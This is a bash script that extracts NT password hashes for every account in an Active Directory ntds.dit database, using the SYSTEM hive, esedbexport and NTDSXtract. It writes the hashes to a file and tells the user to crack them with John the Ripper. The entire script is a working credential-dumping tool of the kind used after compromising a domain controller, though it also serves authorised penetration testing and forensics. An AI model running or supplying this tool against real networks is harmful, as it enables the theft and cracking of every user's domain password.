#!/bin/bash
if [ $# -lt 2 ]; then
   echo "usage: $0  /path/to/ntds.dit /path/to/SYSTEM";
   echo "The output format will be NT MD4 crackable with john as 'john --format=nt <hashfile>'"
   exit 1;
fi
#
# This script relies on a few utilities which had to be downloaded from:
# http://ntdsxtract.com/downloads/ntdsxtract/ntdsxtract_v1_0.zip
# http://sourceforge.net/projects/libesedb/
# See for details: http://moveaxeip.wordpress.com/2012/03/09/active-directory-dc-hash-extraction-ntds-dit/
# note that the libraries built from libesedb may need to manually copied to /usr/lib after make install
#

rm /tmp/ntds.out 1>/dev/null 2>&1
esedbexport  -t /tmp/out $1 1>/dev/null 2>&1
python /opt/NTDSXtract\ 1.0/dsusers.py  /tmp/out.export/datatable.3 /tmp/out.export/link_table.5  --passwordhashes $2  >/tmp/ntdsdata.txt 2>/dev/null
grep -A 1 "Password hashes:" /tmp/ntdsdata.txt  | grep -v "Password hashes" | grep -v "-" | sort |tr -d "\t" | grep -v "^$" > $HOME/ntdshashes.txt
rm /tmp/ntdsdata.txt  1>/dev/null 2>&1
echo "NT MD4 hashes output to $HOME/ntdshashes.txt"
echo "use john --format=nt <file> to crack"
echo "[`date`] done."


